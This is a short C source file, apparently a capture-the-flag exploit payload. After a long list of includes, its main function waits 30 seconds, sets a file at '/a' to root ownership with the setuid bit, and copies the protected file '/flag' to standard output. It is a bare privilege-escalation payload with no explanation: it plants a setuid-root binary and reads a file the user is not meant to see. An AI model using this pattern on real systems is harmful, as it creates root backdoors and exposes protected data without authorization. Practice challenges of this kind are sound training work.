#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <capstone/capstone.h>
#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

int main(){
    sleep(30);
    chown("/a", 0, 0);
    chmod("/a", 04755);
    sendfile(1, open("/flag", 0), 0, 1000);
}